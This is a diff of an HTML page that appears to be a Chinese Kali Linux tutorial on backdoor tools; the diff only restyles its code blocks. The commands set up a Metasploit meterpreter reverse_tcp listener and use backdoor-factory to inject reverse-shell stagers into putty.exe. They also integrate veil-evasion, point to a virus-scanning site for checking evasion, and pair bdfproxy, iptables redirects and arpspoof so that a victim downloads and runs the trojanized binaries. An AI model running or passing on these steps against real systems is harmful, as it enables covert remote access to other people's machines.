+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/<span class="keyword">handler</span></span><br><span class="line">msf exploit(multi/<span class="keyword">handler</span>) &gt; <span class="keyword">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(multi/<span class="keyword">handler</span>) &gt; <span class="keyword">set</span> LHOST <span class="number">10.10</span><span class="number">.10</span><span class="number">.131</span></span><br><span class="line">msf exploit(multi/<span class="keyword">handler</span>) &gt; <span class="keyword">set</span> LPORT <span class="number">4444</span></span><br><span class="line">msf exploit(multi/<span class="keyword">handler</span>) &gt; run</span><br></pre></td></tr></table></figure>
+
+</li>
 </ul>
 <p><img src="https://img-blog.csdnimg.cn/20190525145405583.png" alt="在这里插入图片描述"></p>
 <ul>
@@ -777,12 +716,13 @@
 <p><a href="http://www.virscan.org/scan/" target="_blank" rel="noopener">查病毒网站：http://www.virscan.org/scan/</a></p>
 </li>
 </ul>
-<pre><code>  backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 10.10.10.131 -P 4444 --output-file=putty3.exe
-  backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 10.10.10.131 -P 4444 --output-file=putty4.exe –J
-  backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 10.10.10.131 -P 4444 --output-file=putty5.exe -a</code></pre><ul>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H <span class="number">10.10</span><span class="number">.10</span><span class="number">.131</span> -P <span class="number">4444</span> --output-file=putty3.exe</span><br><span class="line">backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H <span class="number">10.10</span><span class="number">.10</span><span class="number">.131</span> -P <span class="number">4444</span> --output-file=putty4.exe –J</span><br><span class="line">backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H <span class="number">10.10</span><span class="number">.10</span><span class="number">.131</span> -P <span class="number">4444</span> --output-file=putty5.exe -a</span><br></pre></td></tr></table></figure>
+
+<ul>
 <li><p>与 veil-evasion 集成</p>
-<pre><code>  root@kali:~# veil-evasion
-  [menu&gt;&gt;]: list</code></pre></li>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# veil-evasion</span><br><span class="line">[<span class="symbol">menu&gt;&gt;</span>]: <span class="link">list</span></span><br></pre></td></tr></table></figure>
+
+</li>
 </ul>
 <p><img src="https://img-blog.csdnimg.cn/20190525145414174.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <h4 id="后门工具–Bdfproxy"><a href="#后门工具–Bdfproxy" class="headerlink" title="后门工具–Bdfproxy"></a>后门工具–Bdfproxy</h4><h4 id="1-简介-1"><a href="#1-简介-1" class="headerlink" title="1.简介"></a>1.简介</h4><ul>
@@ -810,26 +750,32 @@
 </ul>
 <h4 id="2-使用-1"><a href="#2-使用-1" class="headerlink" title="2.使用"></a>2.使用</h4><ul>
 <li><p>修改 IP 转发</p>
-<pre><code>root@kali:~# vim /etc/sysctl.conf 
-net.ipv4.ip_forward=1</code></pre></li>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># vim /etc/sysctl.conf </span></span><br><span class="line">net.ipv4.ip_forward=<span class="number">1</span></span><br></pre></td></tr></table></figure>
+</li>
 <li><p>修改 iptables</p>
-<pre><code>root@kali:~# iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080
-root@kali:~# iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8080</code></pre></li>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# iptables -t<span class="built_in"> nat </span>-A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080</span><br><span class="line">root@kali:~# iptables -t<span class="built_in"> nat </span>-A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8080</span><br></pre></td></tr></table></figure>
+</li>
 <li><p>修改配置文件</p>
-<pre><code>root@kali:~# vim /etc/bdfproxy/bdfproxy.cfg
-proxyMode = transparent  
-HOST = 10.10.10.131     #108行，117行，128行，替换所有的，有6个</code></pre></li>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# vim /etc/bdfproxy/bdfproxy.cfg</span><br><span class="line">proxyMode = transparent  </span><br><span class="line">HOST = <span class="number">10.10</span><span class="number">.10</span><span class="number">.131</span>     #<span class="number">108</span>行，<span class="number">117</span>行，<span class="number">128</span>行，替换所有的，有<span class="number">6</span>个</span><br></pre></td></tr></table></figure>
+</li>
 <li><p>启动 bdfproxy</p>
-<pre><code>root@kali:~# bdfproxy</code></pre></li>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># bdfproxy</span></span><br></pre></td></tr></table></figure>
+</li>
 <li><p>启动 msfconsole</p>
-<pre><code>root@kali:~# msfconsole -r /root/bdfproxy_msf_resource.rc
-msf exploit(multi/handler) &gt; jobs</code></pre></li>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># msfconsole -r /root/bdfproxy_msf_resource.rc</span></span><br><span class="line">msf exploit(multi/handler) &gt; jobs</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
 </ul>
 <ul>
 <li><p>arp 欺骗</p>
-<pre><code>root@kali:~# arpspoof -i eth0 -t 10.10.10.133 10.10.10.2</code></pre></li>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# arpspoof -i eth0 -t <span class="number">10.10</span><span class="number">.10</span><span class="number">.133</span> <span class="number">10.10</span><span class="number">.10</span><span class="number">.2</span></span><br></pre></td></tr></table></figure>
+</li>
 <li><p>靶机访问浏览器下载软件，并运行</p>
-<pre><code>![](https://i.imgur.com/1qLFgFZ.png)</code></pre></li>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!<span class="selector-attr">[]</span>(<span class="attribute">https</span>:<span class="comment">//i.imgur.com/1qLFgFZ.png)</span></span><br></pre></td></tr></table></figure>
+
+</li>
 </ul>
 <h4 id="3-无线流量劫持"><a href="#3-无线流量劫持" class="headerlink" title="3.无线流量劫持"></a>3.无线流量劫持</h4><ul>
 <li><p>vi /etc/mana-toolkit/hostapd-mana.conf</p>
